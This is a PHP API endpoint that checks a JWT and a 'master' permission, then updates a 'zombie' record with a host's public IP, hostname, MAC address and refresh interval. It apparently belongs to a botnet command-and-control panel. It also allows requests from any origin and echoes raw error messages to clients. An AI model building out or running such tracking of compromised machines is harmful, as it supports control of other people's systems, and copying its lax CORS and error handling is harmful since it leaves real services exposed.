<?php
// required headers
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Max-Age: 3600");
header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With");
 
// required to encode json web token
include_once 'config/core.php';
include_once 'libs/php-jwt/src/BeforeValidException.php';
include_once 'libs/php-jwt/src/ExpiredException.php';
include_once 'libs/php-jwt/src/SignatureInvalidException.php';
include_once 'libs/php-jwt/src/JWT.php';
use \Firebase\JWT\JWT;
 
// files needed to connect to database
include_once 'config/database.php';
include_once 'objects/zombie.php';

// auxilar functions
include_once 'aux/check_permission.php';
 
// get posted data
$data = json_decode(file_get_contents("php://input"));
 
// get jwt
$jwt=isset($data->jwt) ? $data->jwt : "";
 
// if jwt is not empty
if($jwt){
 
    // if decode succeed, show user details
    try {
 
        // decode jwt
        $decoded = JWT::decode($jwt, $key, array('HS256'));
        // Check who request and permission
        $requested_by = $decoded->data->username;
        $to_update = $data->username;
        // this function raise exceptions in case of error (not requested by a master, or requesting changes on another master)
        check_permission($requested_by, $to_update);

        // get database connection
        $database = new Database();
        $db = $database->getConnection();
        
        // instantiate user object
        $zombie = new Zombie($db);

        // set zombie to update property values
        $zombie->username = $data->username;
        $zombie->current_public_ip = $data->current_public_ip;
        $zombie->current_hostname = $data->current_hostname;
        $zombie->current_mac_addr = $data->current_mac_addr;
        $zombie->refresh_secs = $data->refresh_secs;
        // update the zombie record
        if($zombie->update()){
            // we need to re-generate jwt because user details might be different
            // $token = array(
            //     "iat" => $issued_at,
            //     "exp" => $expiration_time,
            //     "iss" => $issuer,
            //     "data" => array(
            //         //"id" => $zombie->id,
            //         "username" => $zombie->username,
            //         "current_public_ip" => $zombie->current_public_ip,
            //         "current_hostname" => $zombie->current_hostname,
            //         "current_mac_addr" => $zombie->current_mac_addr,
            //         "refresh_secs" => $zombie->refresh_secs
            //     )
            // );
            // $jwt = JWT::encode($token, $key);
            
            // set response code
            http_response_code(200);
            
            // response in json format
            echo json_encode(
                    array(
                        "message" => "User was updated.",
                        "jwt" => $jwt
                    )
                );
        }
        
        // message if unable to update user
        else{
            // set response code
            http_response_code(401);
        
            // show error message
            echo json_encode(array("message" => "Unable to update zombie."));
        }
    }
 
    // if decode fails, it means jwt is invalid or check_permission fails
    catch (Exception $e){
    
        // set response code
        http_response_code(401);
    
        // show error message
        echo json_encode(array(
            "message" => "Access denied.",
            "error" => $e->getMessage()
        ));
    }
}
 

// show error message if jwt is empty
else{
 
    // set response code
    http_response_code(401);
 
    // tell the user access denied
    echo json_encode(array("message" => "Access denied."));
}
?>